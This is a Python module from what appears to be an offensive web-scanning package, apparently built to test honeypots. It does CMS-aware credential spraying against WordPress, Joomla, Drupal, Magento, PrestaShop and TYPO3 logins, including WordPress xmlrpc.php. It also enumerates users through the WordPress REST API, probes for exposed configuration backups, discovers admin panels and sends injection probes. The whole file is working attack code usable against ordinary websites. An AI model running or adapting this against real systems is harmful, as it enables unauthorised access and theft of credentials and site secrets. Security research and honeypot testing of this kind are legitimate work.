"""Attack surface exercised after fingerprinting (``http_scan`` phase 4).

Two strategies:

* ``attack_cms`` — when a CMS is recognised, hit its known authentication
  vectors (e.g. WordPress ``wp-login.php`` form + ``xmlrpc.php`` multicall),
  enumerate users where the platform leaks them, and probe sensitive
  CMS-specific files.
* ``attack_generic`` — otherwise, sweep for sensitive files / backups, discover
  login & admin panels, spray common credentials with several field-name
  conventions, and fire a handful of injection probes.

Everything is logged to the run's results directory; nothing here is
destructive — it only sends requests a real opportunistic scanner would.
"""

from __future__ import annotations

import json
import logging
import re
import time
import urllib.parse
from dataclasses import dataclass, field

from attacker.attacks.common import HttpResponse, ResultsDir, http_request
from attacker.attacks.web_fingerprint import Fingerprint

logger = logging.getLogger(__name__)


@dataclass
class Finding:
    severity: str  # info | low | medium | high | critical
    title: str
    detail: str = ""

    def line(self) -> str:
        suffix = f" — {self.detail}" if self.detail else ""
        return f"[{self.severity.upper():<8}] {self.title}{suffix}"


@dataclass(frozen=True)
class LoginVector:
    name: str
    path: str
    method: str = "POST"
    content_type: str = "application/x-www-form-urlencoded"
    user_field: str = "username"
    pass_field: str = "password"
    extra: tuple[tuple[str, str], ...] = ()
    # ``{user}``/``{pwd}`` are substituted (already URL-encoded) into this body.
    body_template: str | None = None
    success_markers: tuple[str, ...] = ()
    failure_markers: tuple[str, ...] = ()


_REDIRECT_STATUSES = {301, 302, 303, 307, 308}
_AUTH_COOKIE_RE = re.compile(r"logged_in|session|auth|sid|token", re.IGNORECASE)
_LOGIN_FORM_RE = re.compile(
    r'type=["\']password["\']|name=["\'](pass|pwd|passwd|password)["\']'
    r"|<form[^>]+login|id=[\"']loginform",
    re.IGNORECASE,
)
_GENERIC_FAILURE_RE = re.compile(
    r"incorrect|invalid|denied|failed|error|unknown username|try again",
    re.IGNORECASE,
)

# --- WordPress XML-RPC multicall (amplified brute-force vector) -------------
_WP_XMLRPC_TEMPLATE = (
    '<?xml version="1.0"?><methodCall>'
    "<methodName>wp.getUsersBlogs</methodName><params>"
    "<param><value><string>{user}</string></value></param>"
    "<param><value><string>{pwd}</string></value></param>"
    "</params></methodCall>"
)

# --- CMS-specific login vectors --------------------------------------------
CMS_LOGIN_VECTORS: dict[str, tuple[LoginVector, ...]] = {
    "WordPress": (
        LoginVector(
            name="wp-login.php form",
            path="/wp-login.php",
            user_field="log",
            pass_field="pwd",
            extra=(("wp-submit", "Log In"), ("testcookie", "1")),
            failure_markers=("login_error", "incorrect", "Unknown username"),
        ),
        LoginVector(
            name="xmlrpc.php wp.getUsersBlogs",
            path="/xmlrpc.php",
            content_type="text/xml",
            body_template=_WP_XMLRPC_TEMPLATE,
            success_markers=("isAdmin", "<name>url</name>", "blogid"),
            failure_markers=("faultCode", "Incorrect username or password"),
        ),
    ),
    "Joomla": (
        LoginVector(
            name="administrator login",
            path="/administrator/index.php",
            user_field="username",
            pass_field="passwd",
            extra=(("option", "com_login"), ("task", "login")),
            failure_markers=("Username and password do not match", "login"),
        ),
    ),
    "Drupal": (
        LoginVector(
            name="user/login form",
            path="/user/login",
            user_field="name",
            pass_field="pass",
            extra=(("form_id", "user_login_form"), ("op", "Log in")),
            failure_markers=("Unrecognized username", "password", "not recognized"),
        ),
    ),
    "Magento": (
        LoginVector(
            name="admin login",
            path="/index.php/admin/",
            user_field="login[username]",
            pass_field="login[password]",
            failure_markers=("invalid", "incorrect"),
        ),
    ),
    "PrestaShop": (
        LoginVector(
            name="admin login",
            path="/admin/",
            user_field="email",
            pass_field="passwd",
            extra=(("submitLogin", "1"), ("ajax", "1")),
            failure_markers=("invalid", "failed", "Employee"),
        ),
    ),
    "TYPO3": (
        LoginVector(
            name="backend login",
            path="/typo3/index.php",
            user_field="username",
            pass_field="userident",
            failure_markers=("error", "login"),
        ),
    ),
}

# --- CMS-specific recon paths (sensitive files / disclosure) ---------------
CMS_RECON_PATHS: dict[str, tuple[tuple[str, str], ...]] = {
    "WordPress": (
        ("/wp-config.php.bak", "high"),
        ("/wp-config.php~", "high"),
        ("/wp-config.php.save", "high"),
        ("/.wp-config.php.swp", "high"),
        ("/wp-content/debug.log", "medium"),
        ("/wp-content/uploads/", "low"),
        ("/wp-json/wp/v2/users", "medium"),
        ("/readme.html", "low"),
        ("/wp-admin/install.php", "medium"),
        ("/wp-content/plugins/", "low"),
    ),
    "Joomla": (
        ("/configuration.php~", "high"),
        ("/configuration.php.bak", "high"),
        ("/administrator/logs/", "medium"),
        ("/README.txt", "low"),
        ("/web.config.txt", "medium"),
    ),
    "Drupal": (
        ("/sites/default/settings.php.bak", "high"),
        ("/sites/default/files/", "low"),
        ("/CHANGELOG.txt", "low"),
        ("/user/register", "low"),
        ("/?q=user/password", "low"),
    ),
    "Magento": (
        ("/app/etc/local.xml", "high"),
        ("/app/etc/env.php", "high"),
        ("/var/log/exception.log", "medium"),
        ("/downloader/", "medium"),
    ),
    "PrestaShop": (
        ("/config/settings.inc.php", "high"),
        ("/admin-dev/", "medium"),
        ("/.git/config", "medium"),
    ),
    "TYPO3": (
        ("/typo3conf/LocalConfiguration.php", "high"),
        ("/typo3temp/", "low"),
    ),
}

# --- Generic discovery: login / admin entry points -------------------------
COMMON_LOGIN_PATHS: tuple[str, ...] = (
    "/login",
    "/admin",
    "/admin/",
    "/admin/login",
    "/administrator",
    "/administrator/",
    "/user/login",
    "/wp-login.php",
    "/manager/html",
    "/phpmyadmin/",
    "/phpMyAdmin/",
    "/adminer.php",
    "/login.php",
    "/admin.php",
    "/signin",
    "/account/login",
    "/cms/login",
    "/panel",
    "/console",
)

# Field-name conventions tried when spraying a discovered generic login form.
_GENERIC_FIELD_COMBOS: tuple[tuple[str, str], ...] = (
    ("username", "password"),
    ("user", "pass"),
    ("email", "password"),
    ("login", "passwd"),
    ("log", "pwd"),
)


def _build_body(vector: LoginVector, user: str, password: str) -> tuple[bytes, str]:
    if vector.body_template is not None:
        body = vector.body_template.format(
            user=urllib.parse.quote(user),
            pwd=urllib.parse.quote(password),
        )
        return body.encode(), vector.content_type

    fields = {vector.user_field: user, vector.pass_field: password}
    fields.update(dict(vector.extra))
    return urllib.parse.urlencode(fields).encode(), vector.content_type


def _login_succeeded(response: HttpResponse, vector: LoginVector) -> bool:
    if response is None or response.status is None:
        return False

    haystack = response.body
    if any(re.search(m, haystack, re.IGNORECASE) for m in vector.failure_markers):
        return False

    if vector.success_markers:
        return any(
            re.search(m, haystack, re.IGNORECASE) for m in vector.success_markers
        )

    # No explicit markers: a redirect that drops an auth cookie is the classic
    # "you're in" signal (matches the WordPress honeypot's behaviour).
    if response.status in _REDIRECT_STATUSES:
        cookies = response.header("set-cookie")
        location = response.header("location")
        if _AUTH_COOKIE_RE.search(cookies) and not re.search(
            r"login", location, re.IGNORECASE
        ):
            return True

    if response.status == 200 and not _GENERIC_FAILURE_RE.search(haystack):
        cookies = response.header("set-cookie")
        if _AUTH_COOKIE_RE.search(cookies):
            return True

    return False


def _attempt_login(
    base_url: str,
    vector: LoginVector,
    user: str,
    password: str,
    *,
    timeout: float,
) -> tuple[HttpResponse, bool]:
    body, content_type = _build_body(vector, user, password)
    response = http_request(
        base_url,
        vector.path,
        method=vector.method,
        headers={"Content-Type": content_type},
        body=body,
        timeout=timeout,
        capture_body=True,
        allow_redirects=False,
    )
    return response, _login_succeeded(response, vector)


def _spray(
    base_url: str,
    vector: LoginVector,
    credentials: list[tuple[str, str]],
    log: list[str],
    findings: list[Finding],
    *,
    timeout: float,
    pause: float,
    max_attempts: int,
) -> tuple[int, list[tuple[str, str]]]:
    attempts = 0
    found: list[tuple[str, str]] = []
    for user, password in credentials:
        if attempts >= max_attempts:
            break

        attempts += 1
        response, success = _attempt_login(
            base_url,
            vector,
            user,
            password,
            timeout=timeout,
        )
        status = (
            response.status if response.status is not None else f"ERR({response.error})"
        )
        outcome = "SUCCESS" if success else "fail"
        log.append(f"{vector.name:<32} {user}:{password:<14} -> {status} [{outcome}]")
        if success:
            logger.info("Valid credentials via %s: %s:%s", vector.name, user, password)
            found.append((user, password))
            findings.append(
                Finding(
                    "critical",
                    f"Valid credentials accepted ({vector.name})",
                    f"{user}:{password} at {vector.path}",
                )
            )
            # Keep spraying: do not stop at the first hit. The full set of
            # accepted pairs is what the honeypot check uses to tell a real
            # weak credential apart from a trap that waves everyone through.

        time.sleep(pause)

    return attempts, found


def _enumerate_wordpress_users(base_url: str, *, timeout: float) -> list[str]:
    response = http_request(
        base_url,
        "/wp-json/wp/v2/users",
        timeout=timeout,
        capture_body=True,
    )
    if response.status != 200:
        return []

    try:
        data = json.loads(response.body)
    except (ValueError, TypeError):
        return []

    users: list[str] = []
    if isinstance(data, list):
        for entry in data:
            if isinstance(entry, dict):
                slug = entry.get("slug") or entry.get("name")
                if isinstance(slug, str) and slug and slug not in users:
                    users.append(slug)

    return users


@dataclass
class AttackOutcome:
    login_attempts: int = 0
    sensitive_paths: int = 0
    found_credentials: list[tuple[str, str]] = field(default_factory=list)
    findings: list[Finding] = field(default_factory=list)

    @property
    def credentials_found(self) -> int:
        return len(self.found_credentials)


def _probe_paths(
    base_url: str,
    paths: list[tuple[str, str]],
    log: list[str],
    findings: list[Finding],
    *,
    timeout: float,
    pause: float,
) -> int:
    hits = 0
    for path, severity in paths:
        response = http_request(base_url, path, timeout=timeout, capture_body=True)
        status = (
            response.status if response.status is not None else f"ERR({response.error})"
        )
        log.append(f"GET {path:<48} {status}")
        if response.status == 200 and response.body.strip():
            hits += 1
            findings.append(
                Finding(severity, f"Reachable sensitive path: {path}", f"HTTP {status}")
            )
        time.sleep(pause)

    return hits


def attack_cms(
    base_url: str,
    fp: Fingerprint,
    results: ResultsDir,
    *,
    credentials: list[tuple[str, str]],
    extra_paths: list[str] | None = None,
    timeout: float = 10.0,
    pause: float = 0.3,
    max_attempts: int = 40,
) -> AttackOutcome:
    """Run CMS-aware recon + authentication attacks for a recognised CMS.

    ``extra_paths`` carries endpoints found by the earlier content-discovery
    phase (dirsearch); they are probed alongside the CMS-specific recon list so
    discovery actually feeds the attack instead of being thrown away.
    """
    outcome = AttackOutcome()
    log: list[str] = [f"# CMS attack: {fp.cms} {fp.cms_version}".rstrip()]

    recon = list(CMS_RECON_PATHS.get(fp.cms, ()))
    known = {path for path, _ in recon}
    recon += [(p, "info") for p in (extra_paths or []) if p not in known]
    if recon:
        log.append("\n## Recon paths")
        outcome.sensitive_paths += _probe_paths(
            base_url,
            recon,
            log,
            outcome.findings,
            timeout=timeout,
            pause=pause,
        )

    enum_users: list[str] = []
    if fp.cms == "WordPress":
        enum_users = _enumerate_wordpress_users(base_url, timeout=timeout)
        if enum_users:
            log.append(f"\n## Enumerated users: {', '.join(enum_users)}")
            outcome.findings.append(
                Finding(
                    "medium",
                    "User enumeration via REST API",
                    f"{len(enum_users)} user(s): {', '.join(enum_users)}",
                )
            )

    # Pair enumerated usernames against the password list, plus default creds.
    passwords = [pwd for _, pwd in credentials]
    targeted = [(user, pwd) for user in enum_users for pwd in passwords]
    cred_plan = list(dict.fromkeys(targeted + credentials))

    log.append("\n## Login attempts")
    for vector in CMS_LOGIN_VECTORS.get(fp.cms, ()):
        attempts, found = _spray(
            base_url,
            vector,
            cred_plan,
            log,
            outcome.findings,
            timeout=timeout,
            pause=pause,
            max_attempts=max_attempts,
        )
        outcome.login_attempts += attempts
        outcome.found_credentials.extend(found)

    results.file("cms-attack.txt").write_text("\n".join(log), encoding="utf-8")
    return outcome


def _looks_like_login(response: HttpResponse) -> bool:
    if response.status in (401, 403):
        return True

    if response.status == 200 and _LOGIN_FORM_RE.search(response.body):
        return True

    return False


def attack_generic(
    base_url: str,
    results: ResultsDir,
    *,
    sensitive_paths: list[str],
    injections: list[str],
    credentials: list[tuple[str, str]],
    extra_paths: list[str] | None = None,
    timeout: float = 10.0,
    pause: float = 0.3,
    max_attempts: int = 40,
) -> AttackOutcome:
    """Discovery + spray for targets that are not a recognised CMS.

    ``extra_paths`` carries endpoints found by the earlier content-discovery
    phase (dirsearch); they extend the static login/admin candidate list so the
    credential spray targets the real attack surface, not only well-known paths.
    """
    outcome = AttackOutcome()
    log: list[str] = ["# Generic attack (no CMS fingerprinted)"]

    # 1. Sensitive files / backups / config disclosure.
    log.append("\n## Sensitive paths")
    outcome.sensitive_paths += _probe_paths(
        base_url,
        [(p, "high") for p in sensitive_paths],
        log,
        outcome.findings,
        timeout=timeout,
        pause=pause,
    )

    # 2. Discover login / admin entry points (well-known + dirsearch hits).
    log.append("\n## Login discovery")
    candidate_paths = list(COMMON_LOGIN_PATHS)
    for path in extra_paths or []:
        if path not in candidate_paths:
            candidate_paths.append(path)

    discovered: list[str] = []
    for path in candidate_paths:
        response = http_request(base_url, path, timeout=timeout, capture_body=True)
        status = (
            response.status if response.status is not None else f"ERR({response.error})"
        )
        if _looks_like_login(response):
            discovered.append(path)
            log.append(f"GET {path:<32} {status}  <-- login/admin")
            outcome.findings.append(Finding("low", f"Login/admin panel found: {path}"))
        else:
            log.append(f"GET {path:<32} {status}")
        time.sleep(pause)

    # 3. Spray credentials against discovered login endpoints.
    if discovered:
        log.append("\n## Credential spray")

    attempts_budget = max_attempts
    for path in discovered:
        for user_field, pass_field in _GENERIC_FIELD_COMBOS:
            if attempts_budget <= 0:
                break
            vector = LoginVector(
                name=f"{path} ({user_field}/{pass_field})",
                path=path,
                user_field=user_field,
                pass_field=pass_field,
            )
            spent, found = _spray(
                base_url,
                vector,
                credentials[: max(1, attempts_budget)],
                log,
                outcome.findings,
                timeout=timeout,
                pause=pause,
                max_attempts=attempts_budget,
            )
            outcome.login_attempts += spent
            outcome.found_credentials.extend(found)
            attempts_budget -= spent

    # 4. Injection probes (SQLi / traversal / LFI) on the query string.
    if injections:
        log.append("\n## Injection probes")
        for raw in injections:
            path = raw if raw.startswith("/") else "/" + raw
            response = http_request(base_url, path, timeout=timeout, capture_body=True)
            status = (
                response.status
                if response.status is not None
                else f"ERR({response.error})"
            )
            log.append(f"GET {path:<60} {status}")
            if response.status and response.status >= 500:
                outcome.findings.append(
                    Finding(
                        "medium",
                        "Server error on injection probe",
                        f"{path} -> {status}",
                    )
                )
            time.sleep(pause)

    results.file("generic-attack.txt").write_text("\n".join(log), encoding="utf-8")
    return outcome
